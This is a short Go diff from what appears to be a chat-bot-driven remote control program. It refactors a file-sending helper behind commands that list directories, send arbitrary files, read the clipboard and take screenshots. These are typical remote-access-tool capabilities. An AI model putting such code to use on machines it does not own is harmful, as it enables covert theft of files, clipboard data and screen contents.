@@ -7,13 +7,14 @@ import (
 	"path/filepath"
 )
 
-func sendFile(chatID int64, fullpath string) {
+
+func wrapSendFile(chatID int64, fullpath string) {
     data, err := os.ReadFile(fullpath)
     if err != nil {
         SendMessage(chatID, err.Error())
         return
     }
-	sendDocument(chatID, filepath.Base(fullpath), data)
+	sendFile(chatID, filepath.Base(fullpath), data)
 }
 
 func parseCommand(chatID int64, text string) {
@@ -27,7 +28,7 @@ func parseCommand(chatID int64, text string) {
 	case "/showdir":
 		showDir(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
 	case "/down":
-		sendFile(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
+		wrapSendFile(chatID, strings.Trim(strings.Join(commandParts[1:], " "), `"'`))
 	case "/clip":
 		getClipboard(chatID)
 	case "/screen":
@@ -38,7 +39,6 @@ func parseCommand(chatID int64, text string) {
 }
 
 func onStart() {
-
 }
 
 func main() {
